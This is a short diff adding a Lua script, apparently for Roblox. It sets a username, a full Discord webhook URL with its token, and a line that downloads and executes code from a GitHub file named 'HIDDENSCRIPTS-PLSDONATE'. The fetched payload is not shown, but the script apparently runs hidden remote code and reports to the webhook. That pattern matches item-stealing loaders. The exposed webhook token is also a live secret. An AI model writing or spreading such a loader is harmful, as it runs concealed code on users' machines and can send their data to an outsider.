@@ -1,0 +1,4 @@
+Username = "aihamaamgs"
+Webhook = "https://discord.com/api/webhooks/1358148114342613265/Yr96RnauGA2Sx7zjHyPmEqO_DcQww7kywpoLXvJ77mWuo8AmuPhhsglZLmj_HtxHWSnn"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vax3478/Vax/refs/heads/main/HIDDENSCRIPTS-PLSDONATE")
